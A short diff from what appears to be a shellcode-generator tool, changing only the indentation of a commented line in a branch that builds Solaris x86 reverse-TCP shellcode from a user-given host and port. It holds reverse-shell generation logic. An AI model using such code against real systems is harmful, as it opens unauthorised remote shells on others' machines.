@@ -285,7 +285,7 @@ def generator( choose, shellcode, argv="None", argv2="None"):
                                 from Solarisx86.reverse_tcp import reverse_tcp
                                 from stackconvert import IP
                                 from stackconvert import PORT
-				#return reverse_tcp(host=IP(argv), port=PORT(argv2))
+								#return reverse_tcp(host=IP(argv), port=PORT(argv2))
                                 dombili = IP(argv)
                                 kocakari = PORT(argv2)
                                 return reverse_tcp(host=dombili, port=kocakari)
